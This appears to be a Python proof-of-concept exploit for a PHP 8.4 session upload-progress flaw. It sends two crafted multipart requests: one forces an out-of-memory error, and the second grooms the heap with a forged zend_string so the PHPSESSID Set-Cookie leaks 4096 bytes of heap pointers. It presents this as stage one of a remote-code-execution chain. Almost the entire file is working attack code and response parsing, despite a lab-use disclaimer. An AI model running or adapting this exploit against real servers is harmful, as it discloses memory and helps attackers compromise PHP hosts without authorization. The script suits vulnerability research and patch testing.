#!/usr/bin/env python3
"""
CVE-2026-109618 -- Stage 1 heap leak via PHPSESSID cookie.

Uses the exact calibration values from devploit's verified profile for
php:8.4.26-apache (amd64). This is a TWO-REQUEST chain:

  Request A (OOM trigger):
    1001 x 1B fields (fill max_input_vars)
    + PHPSESSID=\x00 (null session ID)
    + PHP_SESSION_UPLOAD_PROGRESS=pwn (activate progress tracking)
    + file part (triggers FILE_START, allocates progress structures)
    + big field (~20MB, triggers OOM AFTER progress is set up)

  Request B (heap leak):
    PHPSESSID=<known SID>
    + PHP_SESSION_UPLOAD_PROGRESS=pwn
    + 841 fields of 48B (groom heap so field v0841 reclaims freed slot)
    + forged zend_string block (79B, fakes len=0x1000 for 4096B cookie)

The stale PS(id) in the worker reads from the groomed heap, and Apache
writes a Set-Cookie with 4096 bytes of heap data containing Zend MM
chunk base pointers.

Profile: php-8.4.26-bookworm-amd64 (rce=true, verified by devploit)
  stage1_n = 841
  stage1_forge_len = 79

For authorized security research and local lab use only.
"""

import socket
import struct
import sys
import time
from collections import Counter


def make_part(boundary, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build_request_a(boundary, memory_limit_mb=8, oom_margin_mb=12):
    """Request A: trigger OOM after session progress structures are allocated."""
    body = b""
    # 1001 x 1B fields to fill max_input_vars (stops registration, not parsing)
    for i in range(1001):
        body += make_part(boundary, f"p{i:04d}", b"x") + b"\r\n"

    # Session ID = null byte (creates minimal session state)
    body += make_part(boundary, "PHPSESSID", b"\x00") + b"\r\n"

    # Activate upload progress tracking
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"pwn") + b"\r\n"

    # File part: triggers FILE_START event, allocates session progress structures
    body += make_part(boundary, "f", b"A" * 4096, filename="upload.bin") + b"\r\n"

    # Big field: triggers OOM during data buffering (AFTER progress is set up)
    big_size = (memory_limit_mb + oom_margin_mb) * 1024 * 1024
    body += make_part(boundary, "huge", b"X" * big_size) + b"\r\n"

    body += b"--" + boundary + b"--\r\n"
    return body


def build_request_b(boundary, sid, n=841, forge_len=79):
    """Request B: groom heap and read stale PS(id) via Set-Cookie."""
    body = b""
    # Session ID (controls what gets written to Set-Cookie)
    body += make_part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"

    # Activate upload progress
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"pwn") + b"\r\n"

    # N fields of 48B each: groom the heap
    # Field at index N reclaims the freed session block
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        body += make_part(boundary, str(1000 + i), val.encode()) + b"\r\n"

    # Forged zend_string block: fakes len=0x1000 for a 4096-byte cookie
    forge = bytearray(b"A" * forge_len)
    if forge_len >= 0x19:
        struct.pack_into("<Q", forge, 0x10, 0x1000)  # zend_string.len = 4096
        forge[0x18] = ord("L")  # type marker
    body += make_part(boundary, "1999", bytes(forge)) + b"\r\n"

    body += b"--" + boundary + b"--\r\n"
    return body


def send_request(host, port, path, boundary, body, timeout=60):
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        # Send in chunks to avoid memory issues on our side
        total = headers + body
        offset = 0
        chunk_size = 1024 * 1024  # 1MB chunks
        while offset < len(total):
            sent = sock.send(total[offset:offset + chunk_size])
            offset += sent
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
        return resp
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return f"ERROR: {e}".encode()


def extract_cookie(resp):
    """Extract PHPSESSID value from Set-Cookie header."""
    import urllib.parse
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"PHPSESSID=" in line:
            raw = line.split(b"PHPSESSID=")[1].split(b";")[0]
            try:
                decoded = urllib.parse.unquote_to_bytes(raw.decode("latin-1"))
            except Exception:
                decoded = raw
            return decoded
    return b""


def find_chunk_base(raw):
    """Look for repeated page-aligned pointer values in the cookie data."""
    if len(raw) < 16:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x10000 < v < 0x0001000000000000:
            c[v & ~0x1FFFFF] += 1  # 2MB aligned (Zend MM chunk)
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 4 else 0


def analyze_response(resp, label):
    if not resp or resp.startswith(b"ERROR:"):
        print(f"  [{label}] {resp[:200].decode('latin-1', 'replace')}")
        return

    status = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    hdr_end = resp.find(b"\r\n\r\n")
    body = resp[hdr_end + 4:] if hdr_end > 0 else b""

    oom = b"Allowed memory size" in body
    oom_detail = ""
    if oom:
        idx = body.find(b"Allowed memory size")
        oom_detail = body[idx:idx + 200].decode("latin-1", "replace")

    # Count cookies
    cookies = 0
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:"):
            cookies += 1

    print(f"  [{label}] {status} | body={len(body)}B | oom={oom} | set-cookie={cookies}")
    if oom_detail:
        print(f"    OOM: {oom_detail[:120]}")

    cookie_data = extract_cookie(resp)
    if cookie_data:
        print(f"    PHPSESSID: {len(cookie_data)} bytes")
        if len(cookie_data) > 40:
            print(f"    *** LARGE COOKIE: {len(cookie_data)} bytes ***")
            print(f"    First 80 hex: {cookie_data[:80].hex()}")
            chunk = find_chunk_base(cookie_data)
            if chunk:
                print(f"    *** CHUNK BASE: {hex(chunk)} ***")
            # Look for pointer-like values
            ptrs = []
            for i in range(0, min(len(cookie_data), 500) - 7):
                v = int.from_bytes(cookie_data[i:i + 8], "little")
                if 0x7f0000000000 <= v <= 0x7fffffffffff:
                    ptrs.append((i, v))
                elif 0x550000000000 <= v <= 0x55ffffffffffff:
                    ptrs.append((i, v))
            if ptrs:
                print(f"    Pointer-like values found: {len(ptrs)}")
                for off, val in ptrs[:5]:
                    print(f"      offset {off}: {hex(val)}")
        elif len(cookie_data) > 0:
            try:
                print(f"    PHPSESSID value: {cookie_data.decode('latin-1')[:60]}")
            except Exception:
                print(f"    PHPSESSID hex: {cookie_data[:60].hex()}")
    print()


def main():
    host = "127.0.0.1"
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8896
    path = "/index.php"
    boundary = b"S" * 17  # Match upstream boundary style
    sid = "php2shell-stage1"

    print("=" * 60)
    print("CVE-2026-109618: Stage 1 Heap Leak Test")
    print("=" * 60)
    print(f"Target: http://{host}:{port}{path}")
    print(f"Profile: php-8.4.26-bookworm-amd64")
    print(f"  stage1_n = 841, stage1_forge_len = 79")
    print(f"  memory_limit = 8M, oom_margin = 12M")
    print()

    attempts = 5
    for attempt in range(1, attempts + 1):
        print(f"--- Attempt {attempt}/{attempts} ---")

        # Request A: OOM trigger
        print("  Sending Request A (OOM trigger)...")
        body_a = build_request_a(boundary, memory_limit_mb=8, oom_margin_mb=12)
        print(f"    Body size: {len(body_a)} bytes ({len(body_a) / 1024 / 1024:.1f} MB)")
        resp_a = send_request(host, port, path, boundary, body_a, timeout=120)
        analyze_response(resp_a, "ReqA")

        # Small delay for worker to settle
        time.sleep(0.3)

        # Request B: Heap leak
        print("  Sending Request B (heap leak)...")
        body_b = build_request_b(boundary, sid, n=841, forge_len=79)
        print(f"    Body size: {len(body_b)} bytes ({len(body_b) / 1024:.0f} KB)")
        resp_b = send_request(host, port, path, boundary, body_b, timeout=30)
        analyze_response(resp_b, "ReqB")

        cookie_data = extract_cookie(resp_b)
        chunk = find_chunk_base(cookie_data) if len(cookie_data) > 40 else 0
        if chunk:
            print(f"  [+] HEAP LEAK SUCCESSFUL: chunk_base = {hex(chunk)}")
            print()
            break

        print()

    print("Done.")


if __name__ == "__main__":
    main()
